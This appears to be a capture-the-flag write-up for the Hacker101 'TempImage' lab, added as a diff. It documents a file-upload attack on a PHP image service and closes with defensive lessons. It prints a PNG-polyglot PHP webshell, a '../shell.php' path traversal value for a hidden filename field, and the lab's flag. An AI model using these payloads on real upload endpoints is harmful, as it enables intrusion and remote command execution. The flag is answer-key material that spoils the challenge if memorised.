@@ -1,0 +1,68 @@
+================================
+LAB: TempImage - Flag 1
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-02-26
+Lab URL: https://b9e49df19b20124e6211e3a23773c62b.ctf.hacker101.com
+Category: File Upload / Path Traversal
+Level: Moderate
+Objective: Exploit file upload functionality to retrieve the flag
+Description: TempImage is a PHP-based image upload service (UNREGISTERED/trial mode). Upload form sends filename via a separate hidden input field controllable client-side.
+
+[RECONNAISSANCE]
+----------------
+GET / -> HTML page, link to upload.php, PHP/5.5.9, openresty/1.27.1.2
+
+GET /upload.php -> Form POSTs to doUpload.php (multipart/form-data)
+  Key finding: two separate fields
+    - name="file"     -> actual file binary
+    - name="filename" -> hidden input, JS-populated with filename, sent separately
+
+Normal upload response (dreamhouse-logo.png):
+  HTTP 302 -> Location: files/c92b47493652991271cd86c68b12dc37_dreamhouse-logo.png
+  Pattern: /files/[md5hash]_[filename]
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+1. filename field is client-controlled -> can set arbitrary filename server-side
+2. Server validates PNG via getimagesize() (magic bytes check), not extension only
+3. /files/ directory served as static files by nginx -> PHP not executed there
+4. filename field NOT sanitized for path traversal -> ../shell.php accepted as input
+5. move_uploaded_file() called with unsanitized filename -> path traversal triggered
+
+[EXPLOITATION]
+--------------
+Step 1 - Upload PHP webshell with PNG magic bytes (bypass getimagesize):
+  - File content: [real PNG binary] + <?php system($_GET["cmd"]); ?>
+  - name="file" filename="shell.php", Content-Type: image/png
+  - name="filename" value: shell.php
+  -> HTTP 302, file saved as /files/[hash]_shell.php
+  -> PHP NOT executed (nginx serves /files/ statically)
+
+Step 2 - Path traversal in filename field:
+  - name="filename" value: ../shell.php
+  -> Server builds path: files/[hash]_../shell.php
+  -> move_uploaded_file() fails (invalid path)
+  -> Error handler reveals flag
+
+Payload (filename field):
+  ../shell.php
+
+[EVIDENCE]
+----------
+Response body on path traversal attempt:
+  Warning: move_uploaded_file(files/6c992b5b4654d3da3eb9e414afbc38e2_../shell.php):
+  failed to open stream: No such file or directory in /app/doUpload.php on line 7
+  ERROR: Upload failed
+  ^FLAG^a3f6d7e2e27a365f544ef0e76e2d2b62440212d913536971a19a8d5bf4aca200$FLAG$
+
+
+[LESSONS LEARNED]
+-----------------
+- Never trust client-controlled filename fields; always derive filename server-side
+- Path traversal in upload paths can be triggered even when upload fails
+- getimagesize() alone is not sufficient to validate uploads (polyglot files bypass it)
+- Static file directories (nginx) prevent PHP execution but don't stop path traversal
+- Error messages should never expose flags or sensitive internal paths
